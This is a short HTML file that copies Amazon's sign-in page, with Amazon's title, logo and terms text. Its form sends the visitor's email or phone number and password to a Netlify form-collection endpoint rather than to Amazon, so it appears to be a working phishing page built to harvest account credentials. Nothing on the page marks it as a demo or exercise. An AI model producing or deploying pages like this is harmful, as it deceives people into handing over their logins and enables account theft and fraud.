<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Amazon</title>
</head>
<body>
    <div class="main">
            <img src="logo.png">
        <div class="cont">
            <div class="box">
                <h1>Sign in</h1>
                <form method="POST" data-netlify="true">
                    <label>Email or mobile phone number</label>
                    <input type="text" name="Username">
                    <label >Password <span class="split">Forgot Password</span></label>
                    <input type="text" name="Password">
                    <input type="submit" value="Sign in">
                </form>
                <p>By continuing, you agree to Amazon's <span class="col_blue">Conditions of Use</span> and <span class="col_blue">Privacy Notice</span>.</p>
            </div>
        </div>
    </div>
</body>
</html>
